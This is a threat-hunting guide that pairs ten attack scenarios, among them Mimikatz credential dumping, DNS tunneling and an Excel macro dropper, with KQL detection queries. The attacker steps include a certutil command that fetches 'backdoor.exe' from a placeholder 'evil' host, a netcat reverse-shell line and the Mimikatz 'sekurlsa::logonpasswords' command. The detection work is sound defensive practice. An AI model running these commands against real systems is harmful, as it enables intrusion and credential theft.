# Threat Event (Mimikatz Credential Dumping)
**Unauthorized Credential Access Using Mimikatz**

## Reason for the Hunt:
Endpoint-Based Alert Triggered + SOC Follow-Up
EDR flagged suspicious memory access to lsass.exe from a non-standard PowerShell session.

---

## Steps the "Bad Actor" Took to Create Logs and IoCs:
1. Opened PowerShell as Administrator.
2. Downloaded Mimikatz from a GitHub clone or transferred it via USB.
3. Executed: Invoke-Mimikatz or mimikatz.exe.
4. Accessed lsass.exe to dump cleartext passwords.
5. Extracted credentials from sekurlsa::logonpasswords.
6. Used stolen creds for lateral movement.

---

## Tables Used to Detect IoCs:
| **Name** | **Description** |
|----------|----------------|
| DeviceProcessEvents | Launch of PowerShell, mimikatz.exe, memory reads |
| DeviceImageLoadEvents | DLL injection and memory access to lsass |
| DeviceNetworkEvents | Potential exfil of dumped credentials |

---

## Related Queries (KQL):
```kql
DeviceProcessEvents
| where ProcessCommandLine has_any("mimikatz", "Invoke-Mimikatz")

DeviceImageLoadEvents
| where InitiatingProcessFileName == "mimikatz.exe" and FileName has "lsass.exe"

DeviceProcessEvents
| where ProcessCommandLine contains "sekurlsa" 
```

---



---

## Additional Notes:
- Monitor for abnormal PowerShell execution and lsass access.
- Consider enabling credential guard or LSASS protection.


# Threat Event (DNS Tunneling)
**Data Exfiltration Over DNS Requests**

## Reason for the Hunt:
Network & Application Anomaly Detected by NDR
NDR tool detected high volumes of DNS requests to unusual subdomains with repetitive patterns, potentially indicating DNS tunneling.

---

## Steps the "Bad Actor" Took to Create Logs and IoCs:
1. Used a tunneling tool like iodine, dnscat2, or Heyoka.
2. Established a covert channel over DNS (TCP/UDP port 53).
3. Encoded and exfiltrated data in DNS TXT/A/CNAME requests.
4. The endpoint sent hundreds of DNS queries/minute.

---

## Tables Used to Detect IoCs:
| **Name** | **Description** |
|----------|----------------|
| DeviceNetworkEvents | DNS request patterns, excessive traffic |
| DnsEvents | Lookup records, suspicious subdomains |

---

## Related Queries (KQL):
```kql
DeviceNetworkEvents
| where RemoteUrl endswith ".com"
| where RemoteUrl contains "." and strlen(RemoteUrl) > 50
| summarize count() by DeviceName, RemoteUrl
```

---



---

## Additional Notes:
- DNS tunneling can evade traditional proxies and firewalls.
- Set alerts for high DNS request rates or known tunneling patterns.


# Threat Event (Certutil Abuse)
**Using certutil.exe to Download Malware**

## Reason for the Hunt:
Tool-Based Abuse (LOLBins)
Certutil.exe is often abused to download malicious files via command-line.

---

## Steps the "Bad Actor" Took to Create Logs and IoCs:
1. Launched cmd or PowerShell as user/admin.
2. Ran certutil -urlcache -split -f http://evil[.]site backdoor.exe
3. Dropped the file in %TEMP% or %AppData%.
4. Executed the payload.

---

## Tables Used to Detect IoCs:
| **Name** | **Description** |
|----------|----------------|
| DeviceProcessEvents | certutil.exe use |
| DeviceFileEvents | backdoor.exe creation |
| DeviceNetworkEvents | connection to malicious domain |

---

## Related Queries (KQL):
```kql
DeviceProcessEvents
| where FileName == "certutil.exe" and ProcessCommandLine contains "http"

DeviceFileEvents
| where FileName == "backdoor.exe" 
```

---


---

## Additional Notes:
- Certutil is a known LOLBin.
- Can be disabled or audited via AppLocker or Microsoft Defender Attack Surface Reduction (ASR).


# Threat Event (OAuth Consent Grant Abuse)
**Malicious App Gained Access to Mail and Drive**

## Reason for the Hunt:
Cloud & SaaS Threat Intel Advisory
Threat actors are tricking users into consenting to malicious Microsoft 365 or Google apps with elevated permissions.

---

## Steps the "Bad Actor" Took to Create Logs and IoCs:
1. Created a fake app impersonating a known vendor.
2. Shared OAuth consent URL via phishing email.
3. User granted permissions without verifying app legitimacy.
4. App harvested emails and files silently via Graph API.

---

## Tables Used to Detect IoCs:
| **Name** | **Description** |
|----------|----------------|
| CloudAppEvents | OAuth consent grants |
| CloudAuditLogs | API activity by suspicious app IDs |
| IdentityLogonEvents | Login activity tied to app |

---

## Related Queries (KQL):
```kql
CloudAppEvents
| where ApplicationDisplayName contains "invoice" and PermissionGrantType == "AdminConsent"

CloudAuditLogs
| where OperationName contains "Mail.Read" 
```

---



---

## Additional Notes:
- Monitor and restrict 3rd party app consents.
- Enforce consent policies and periodic app reviews in Microsoft 365/Azure.


# Threat Event (Steam Mod Malware)
**Malicious Steam Workshop Mod Used for Malware Drop**

## Reason for the Hunt:
Gaming & App Abuse Alert + Lateral Movement Attempt
Malicious Steam mod delivered an obfuscated binary that attempted to connect to Discord Webhooks.

---

## Steps the "Bad Actor" Took to Create Logs and IoCs:
1. Installed game mod via Steam Workshop.
2. Mod contained obfuscated binary in /mod/data/init.bin.
3. Launched binary using game engine script.
4. Executable connected to webhook for C2.

---

## Tables Used to Detect IoCs:
| **Name** | **Description** |
|----------|----------------|
| DeviceFileEvents | mod binary dropped |
| DeviceProcessEvents | mod payload executed |
| DeviceNetworkEvents | outbound traffic to webhook |

---

## Related Queries (KQL):
```kql
DeviceFileEvents
| where FileName == "init.bin" and FolderPath contains "Steam\\steamapps"

DeviceNetworkEvents
| where RemoteUrl contains "discord.com/api/webhooks" 
```

---



---

## Additional Notes:
- Treat mod activity like any unsigned binary.
- Steam folder activity should be reviewed in enterprise environments.


# Threat Event (Insider File Theft)
**Employee Copied Confidential Files to USB Before Resignation**

## Reason for the Hunt:
Physical & Insider Threat + HR Coordination
HR flagged an employee as a flight risk. Large volume of sensitive files copied to a USB drive prior to resignation.

---

## Steps the "Bad Actor" Took to Create Logs and IoCs:
1. Plugged in USB at workstation.
2. Searched for financial and strategy documents.
3. Copied large batch of files to external drive.
4. Removed drive without triggering DLP block.

---

## Tables Used to Detect IoCs:
| **Name** | **Description** |
|----------|----------------|
| DeviceFileEvents | File copied to RemovableMedia |
| DeviceEvents | USB insert/remove events |
| DeviceNetworkEvents | Follow-on outbound access to personal cloud |

---

## Related Queries (KQL):
```kql
DeviceFileEvents
| where FolderPath contains "RemovableMedia"
| where FileName endswith ".docx" or FileName endswith ".xlsx"

DeviceEvents
| where ActionType contains "USBDriveConnected" 
```

---



---

## Additional Notes:
- Combine with HR attrition watchlists and DLP rules.
- Correlate file copy events with offboarding timelines.


# Threat Event (Unauthorized Remote Access Tools (AnyDesk))
**Installation and Use of Unauthorized AnyDesk Remote Access**

## Reason for the Hunt:
IT noticed remote control sessions occurring during non-business hours.
AnyDesk was found installed on systems not enrolled in remote support policy.

---

## Steps the "Bad Actor" Took to Create Logs and IoCs:
1. User downloads AnyDesk from official or clone site.
2. Executes installer silently or interacts with minimal prompts.
3. Accepts incoming session request from attacker-controlled system.
4. Attacker gains GUI access and moves laterally.
5. Attempts made to disable security tools or access internal systems.

---

## Tables Used to Detect IoCs:
| **Name** | **Description** |
|----------|----------------|
| DeviceFileEvents | Detect installer drop and binaries |
| DeviceProcessEvents | Monitor execution and session start |
| DeviceNetworkEvents | Check external IPs connecting to AnyDesk |

---

## Related Queries (KQL):
```kql
DeviceProcessEvents
| where FileName in~ ("AnyDesk.exe", "AnyDeskSetup.exe")

DeviceNetworkEvents
| where InitiatingProcessFileName == "AnyDesk.exe"
| project Timestamp, DeviceName, RemoteIP, RemoteUrl
```

---



---

## Additional Notes:
- Consider AppLocker or Defender App Control to block unauthorized remote access tools.
- Review auto-start settings for persistence.


# Threat Event (Malicious Chrome Extension)
**Suspicious Chrome Extension Capturing Clipboard and Tabs**

## Reason for the Hunt:
User reported browser acting strangely.
Investigation revealed a side-loaded Chrome extension harvesting user actions.

---

## Steps the "Bad Actor" Took to Create Logs and IoCs:
1. Attacker tricks user into downloading CRX file or accessing malicious webstore clone.
2. Chrome extension is manually loaded or force-installed via policy change.
3. Extension monitors clipboard, DOM, or cookies.
4. Sends data to attacker C2 (e.g., via webhook or IP endpoint).

---

## Tables Used to Detect IoCs:
| **Name** | **Description** |
|----------|----------------|
| DeviceFileEvents | Detect CRX or unpacked extension folders |
| DeviceProcessEvents | Chrome launch with suspicious flags |
| DeviceNetworkEvents | Extension contacting external domains |

---

## Related Queries (KQL):
```kql
DeviceFileEvents
| where FolderPath contains "Chrome\User Data\Default\Extensions"

DeviceProcessEvents
| where ProcessCommandLine contains "--load-extension"

DeviceNetworkEvents
| where RemoteUrl contains ".webhook.site" or ".ngrok.io" 
```

---



---

## Additional Notes:
- Chrome extensions can bypass traditional endpoint scanning.
- Enable Chrome enterprise reporting for visibility.


# Threat Event (Reverse Shell via Netcat)
**Backdoor Shell Established Using Netcat**

## Reason for the Hunt:
High-privilege user machine showed suspicious connections to a known C2 IP.
Netcat found running in hidden terminal session.

---

## Steps the "Bad Actor" Took to Create Logs and IoCs:
1. Attacker drops nc.exe or variant on target system.
2. Opens reverse shell with: nc.exe <attacker_ip> <port> -e cmd.exe
3. Attacker interacts with target over open port.
4. Persistence achieved via task scheduler or registry key.

---

## Tables Used to Detect IoCs:
| **Name** | **Description** |
|----------|----------------|
| DeviceFileEvents | Netcat binary download or creation |
| DeviceProcessEvents | Netcat execution |
| DeviceNetworkEvents | Connection to external IP or port |

---

## Related Queries (KQL):
```kql
DeviceProcessEvents
| where ProcessCommandLine contains "nc.exe" and ProcessCommandLine contains "-e"

DeviceNetworkEvents
| where RemotePort in (4444, 1337, 8080)
| where InitiatingProcessFileName == "nc.exe" 
```

---



---

## Additional Notes:
- Netcat and its variants (ncat, ncat64) should be monitored or blacklisted.
- Detecting use of -e is key for identifying shells.


# Threat Event (Malicious Excel Macro)
**Excel File with Embedded Macro Payload**

## Reason for the Hunt:
Finance user received phishing email with invoice attachment.
File was opened and triggered PowerShell payload.

---

## Steps the "Bad Actor" Took to Create Logs and IoCs:
1. Phishing email delivers .xlsm or .xls file.
2. User enables content/macro.
3. Macro executes VBA that runs PowerShell.
4. PowerShell downloads and executes malware payload.

---

## Tables Used to Detect IoCs:
| **Name** | **Description** |
|----------|----------------|
| DeviceProcessEvents | PowerShell spawned from Excel |
| DeviceFileEvents | File opened from suspicious source |
| DeviceNetworkEvents | Network beacon from macro payload |

---

## Related Queries (KQL):
```kql
DeviceProcessEvents
| where InitiatingProcessFileName == "EXCEL.EXE"
| where FileName == "powershell.exe"

DeviceFileEvents
| where FileName endswith ".xlsm" or FileName endswith ".xls"
| where FolderPath contains "Downloads" 
```


---

## Additional Notes:
- Block macros from Internet via GPO.
- Use AMSI or Defender for Office for behavioral detection.

 ---

## Created By:
- **Author Name**: Nigeltho12
- **Author Contact**: https://www.linkedin.com/in/nigel-thompson-8a7995244/
- **Date**: April 17, 2025
